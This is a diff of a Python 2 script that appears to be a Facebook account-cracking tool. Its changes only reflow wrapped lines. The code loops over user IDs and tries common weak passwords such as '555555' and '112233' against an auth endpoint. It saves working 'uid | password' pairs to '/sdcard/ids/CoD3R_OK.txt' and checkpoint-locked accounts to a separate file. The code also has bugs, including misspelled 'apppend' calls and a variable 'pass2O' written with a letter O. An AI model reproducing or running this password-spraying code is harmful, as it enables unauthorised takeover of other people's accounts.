@@ -694,8 +694,7 @@ pass5, headers = header).text
 uid + '&pass=' + pass10, headers = header).text
                                                 q = json.loads(data)
                                                 if 'loc' in q:
-                                                    print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + 
-pass10
+                                                    print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass10
                                                     ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                     ok.write(uid + ' | ' + pass10 + '\n')
                                                     ok.close()
@@ -715,15 +714,13 @@ pass10
 id=' + uid + '&pass=' + pass11, headers = header).text
                                                     q = json.loads(data)
                                                     if 'loc' in q:
-                                                        print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + 
-pass11
+                                                        print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass11
                                                         ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                         ok.write(uid + ' | ' + pass11 + '\n')
                                                         ok.close()
                                                         oks.append(uid + pass11)
                                                     elif 'www.facebook.com' in q['error']:
-                                                        print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + 
-pass11
+                                                        print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass11
                                                         cp = open('CoD3R_CP.txt', 'a')
                                                         cp.write(uid + ' | ' + pass11 + '\n')
                                                         cp.close()
@@ -735,15 +732,13 @@ pass11
 ('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers = header).text
                                                         q = json.loads(data)
                                                         if 'loc' in q:
-                                                            print '\033[1;92m[CoD3R-OK] ' + uid + ' | 
-' + pass12
+                                                            print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass12
                                                             ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                             ok.write(uid + ' | ' + pass12 + '\n')
                                                             ok.close()
                                                             oks.append(uid + pass12)
                                                         elif 'www.facebook.com' in q['error']:
-                                                            print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | 
-' + pass12
+                                                            print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass12
                                                             cp = open('CoD3R_CP.txt', 'a')
                                                             cp.write(uid + ' | ' + pass12 + '\n')
                                                             cp.close()
@@ -755,17 +750,13 @@ pass11
 ('http://localhost:5000/auth?id=' + uid + '&pass=' + pass13, headers = header).text
                                                             q = json.loads(data)
                                                             if 'loc' in q:
-                                                                print '\033[1;92m[CoD3R-OK] ' + uid + 
-' | ' + pass13
-                                                                ok = open('/sdcard/ids/CoD3R_OK.txt', 
-
-'a')
+                                                                print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass13
+                                                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                 ok.write(uid + ' | ' + pass13 + '\n')
                                                                 ok.close()
                                                                 oks.append(uid + pass13)
                                                             elif 'www.facebook.com' in q['error']:
-                                                                print '\x1b[1;93m[CoD3R-CP] ' + uid + 
-' | ' + pass13
+                                                                print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass13
                                                                 cp = open('CoD3R_CP.txt', 'a')
                                                                 cp.write(uid + ' | ' + pass13 + '\n')
                                                                 cp.close()
@@ -777,23 +768,15 @@ pass11
 ('http://localhost:5000/auth?id=' + uid + '&pass=' + pass14, headers = header).text
                                                                 q = json.loads(data)
                                                                 if 'loc' in q:
-                                                                    print '\033[1;92m[CoD3R-OK] ' + 
-uid + ' | ' + pass14
-                                                                    ok = open
-
-('/sdcard/ids/CoD3R_OK.txt', 'a')
-                                                                    ok.write(uid + ' | ' + pass14 + 
-
-'\n')
+                                                                    print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass14
+                                                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
+                                                                    ok.write(uid + ' | ' + pass14 + '\n')
                                                                     ok.close()
                                                                     oks.append(uid + pass14)
                                                                 elif 'www.facebook.com' in q['error']:
-                                                                    print '\x1b[1;93m[CoD3R-CP] ' + 
-uid + ' | ' + pass14
+                                                                    print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass14
                                                                     cp = open('CoD3R_CP.txt', 'a')
-                                                                    cp.write(uid + ' | ' + pass14 + 
-
-'\n')
+                                                                    cp.write(uid + ' | ' + pass14 + '\n')
                                                                     cp.close()
                                                                     cps.apppend(uid + pass14)
                                                                 else:
@@ -803,25 +786,15 @@ uid + ' | ' + pass14
 ('http://localhost:5000/auth?id=' + uid + '&pass=' + pass15, headers = header).text
                                                                     q = json.loads(data)
                                                                     if 'loc' in q:
-                                                                       print '\033[1;92m[CoD3R-OK] ' + 
-uid + ' | ' + pass15
-                                                                       ok = open
-
-('/sdcard/ids/CoD3R_OK.txt', 'a')
-                                                                       ok.write(uid + ' | ' + pass15 + 
-
-'\n')
+                                                                       print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass15
+                                                                       ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
+                                                                       ok.write(uid + ' | ' + pass15 + '\n')
                                                                        ok.close()
                                                                        oks.append(uid + pass15)
-                                                                    elif 'www.facebook.com' in q
-
-['error']:
-                                                                        print '\x1b[1;93m[CoD3R-CP] ' 
-+ uid + ' | ' + pass15
+                                                                    elif 'www.facebook.com' in q['error']:
+                                                                        print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass15
                                                                         cp = open('CoD3R_CP.txt', 'a')
-                                                                        cp.write(uid + ' | ' + pass15 
-
-+ '\n')
+                                                                        cp.write(uid + ' | ' + pass15 + '\n')
                                                                         cp.close()
                                                                         cps.apppend(uid + pass15)
                                                                     else:
@@ -831,26 +804,15 @@ uid + ' | ' + pass15
 ('http://localhost:5000/auth?id=' + uid + '&pass=' + pass16, headers = header).text
                                                                         q = json.loads(data)
                                                                         if 'loc' in q:
-                                                                            print '\033[1;92m[CoD3R-
-OK] ' + uid + ' | ' + pass16
-                                                                            ok = open
-
-('/sdcard/ids/CoD3R_OK.txt', 'a')
-                                                                            ok.write(uid + ' | ' + 
-pass16 + '\n')
+                                                                            print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass16
+                                                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
+                                                                            ok.write(uid + ' | ' + pass16 + '\n')
                                                                             ok.close()
                                                                             oks.append(uid + pass16)
-                                                                        elif 'www.facebook.com' in q
-
-['error']:
-                                                                            print '\x1b[1;93m[CoD3R-
-
-CP] ' + uid + ' | ' + pass16
-                                                                            cp = open('CoD3R_CP.txt', 
-
-'a')
-                                                                            cp.write(uid + ' | ' + 
-pass16 + '\n')
+                                                                        elif 'www.facebook.com' in q['error']:
+                                                                            print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass16
+                                                                            cp = open('CoD3R_CP.txt', 'a')
+                                                                            cp.write(uid + ' | ' + pass16 + '\n')
                                                                             cp.close()
                                                                             cps.apppend(uid + pass16)
                                                                         else:
@@ -860,30 +822,17 @@ pass16 + '\n')
 ('http://localhost:5000/auth?id=' + uid + '&pass=' + pass17, headers = header).text
                                                                             q = json.loads(data)
                                                                             if 'loc' in q:
-                                                                                print '\033[1;92m
-[CoD3R-OK] ' + uid + ' | ' + pass17
-                                                                                ok = open
-
-('/sdcard/ids/CoD3R_OK.txt', 'a')
-                                                                                ok.write(uid + ' | ' + 
-pass17 + '\n')
+                                                                                print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass17
+                                                                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
+                                                                                ok.write(uid + ' | ' + pass17 + '\n')
                                                                                 ok.close()
-                                                                                oks.append(uid + 
-pass17)
-                                                                            elif 'www.facebook.com' in 
-
-q['error']:
-                                                                                print '\x1b[1;93m
-
-[CoD3R-CP] ' + uid + ' | ' + pass17
-                                                                                cp = open
-
-('CoD3R_CP.txt', 'a')
-                                                                                cp.write(uid + ' | ' + 
-pass17 + '\n')
+                                                                                oks.append(uid + pass17)
+                                                                            elif 'www.facebook.com' in q['error']:
+                                                                                print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass17
+                                                                                cp = open('CoD3R_CP.txt', 'a')
+                                                                                cp.write(uid + ' | ' + pass17 + '\n')
                                                                                 cp.close()
-                                                                                cps.apppend(uid + 
-pass17)
+                                                                                cps.apppend(uid + pass17)
                                                                             else:
 										pass18 = "555555"
                                                                                 data = requests.get
@@ -891,105 +840,53 @@ pass17)
 ('http://localhost:5000/auth?id=' + uid + '&pass=' + pass18, headers = header).text
                                                                                 q = json.loads(data)
                                                                                 if 'loc' in q:
-                                                                                    print '\033[1;92m
-
-[CoD3R-OK] ' + uid + ' | ' + pass18
-                                                                                    ok = open
-
-('/sdcard/ids/CoD3R_OK.txt', 'a')
-                                                                                    ok.write(uid + ' | 
-' + pass18 + '\n')
+                                                                                    print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass18
+                                                                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
+                                                                                    ok.write(uid + ' | ' + pass18 + '\n')
                                                                                     ok.close()
-                                                                                    oks.append(uid + 
-pass18)
-                                                                                elif 
-
-'www.facebook.com' in q['error']:
-                                                                                    print '\x1b[1;93m
-
-[CoD3R-CP] ' + uid + ' | ' + pass18
-                                                                                    cp = open
-
-('CoD3R_CP.txt', 'a')
-                                                                                    cp.write(uid + ' | 
-' + pass18 + '\n')
+                                                                                    oks.append(uid + pass18)
+                                                                                elif 'www.facebook.com' in q['error']:
+                                                                                    print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass18
+                                                                                    cp = open('CoD3R_CP.txt', 'a')
+                                                                                    cp.write(uid + ' | ' + pass18 + '\n')
                                                                                     cp.close()
-                                                                                    cps.apppend(uid + 
-pass18)
+                                                                                    cps.apppend(uid + pass18)
                                                                                 else:
 										    pass19 = "112233"
                                                                                     data = 
 
 requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass19, headers = header).text
-                                                                                    q = json.loads
-
-(data)
+                                                                                    q = json.loads(data)
                                                                                     if 'loc' in q:
-                                                                                        print '\033
-
-[1;92m[CoD3R-OK] ' + uid + ' | ' + pass19
-                                                                                        ok = open
-
-('/sdcard/ids/CoD3R_OK.txt', 'a')
-                                                                                        ok.write(uid + 
-' | ' + pass19 + '\n')
+                                                                                        print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass19
+                                                                                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
+                                                                                        ok.write(uid + ' | ' + pass19 + '\n')
                                                                                         ok.close()
-                                                                                        oks.append(uid 
-+ pass19)
-                                                                                    elif 
-
-'www.facebook.com' in q['error']:
-                                                                                        print '\x1b
-
-[1;93m[CoD3R-CP] ' + uid + ' | ' + pass19
-                                                                                        cp = open
-
-('CoD3R_CP.txt', 'a')
-                                                                                        cp.write(uid + 
-
-' | ' + pass19 + '\n')
+                                                                                        oks.append(uid + pass19)
+                                                                                    elif 'www.facebook.com' in q['error']:
+                                                                                        print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass19
+                                                                                        cp = open('CoD3R_CP.txt', 'a')
+                                                                                        cp.write(uid + ' | ' + pass19 + '\n')
                                                                                         cp.close()
-                                                                                        cps.apppend
-
-(uid + pass19)
+                                                                                        cps.apppend(uid + pass19)
                                                                                     else:
 											pass2O = "786786"
                                                                                         data = 
 
 requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass20, headers = header).text
-                                                                                        q = 
-
-json.loads(data)
+                                                                                        q = json.loads(data)
                                                                                         if 'loc' in q:
-                                                                                            print 
-
-'\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass20
-                                                                                            ok = open
-
-('/sdcard/ids/CoD3R_OK.txt', 'a')
-                                                                                            ok.write
-
-(uid + ' | ' + pass20 + '\n')
+                                                                                            print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass20
+                                                                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
+                                                                                            ok.write(uid + ' | ' + pass20 + '\n')
                                                                                             ok.close()
-                                                                                            
-
-oks.append(uid + pass20)
-                                                                                        elif 
-
-'www.facebook.com' in q['error']:
-                                                                                            print 
-
-'\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass20
-                                                                                            cp = open
-
-('CoD3R_CP.txt', 'a')
-                                                                                            cp.write
-
-(uid + ' | ' + pass20 + '\n')
+                                                                                            oks.append(uid + pass20)
+                                                                                        elif 'www.facebook.com' in q['error']:
+                                                                                            print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass20
+                                                                                            cp = open('CoD3R_CP.txt', 'a')
+                                                                                            cp.write(uid + ' | ' + pass20 + '\n')
                                                                                             cp.close()
-                                                                                            
-
-cps.apppend(uid + pass20)
+                                                                                            cps.apppend(uid + pass20)
                                                     
         except:
             pass
